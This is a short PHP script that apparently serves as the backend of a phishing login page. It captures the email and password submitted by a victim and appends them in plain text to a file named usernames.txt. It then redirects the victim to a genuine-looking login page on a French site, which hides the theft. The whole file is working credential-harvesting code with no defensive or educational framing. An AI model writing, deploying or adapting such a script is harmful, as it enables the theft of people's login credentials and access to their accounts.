<?php
$email = $_POST['email'];
$pass = $_POST['password'];

file_put_contents("usernames.txt", "Username: " . $email . " Pass: " . $pass . "\n", FILE_APPEND);

header('Location: https://dechetteries.jmst.fr/main/login.php');
exit();
?>
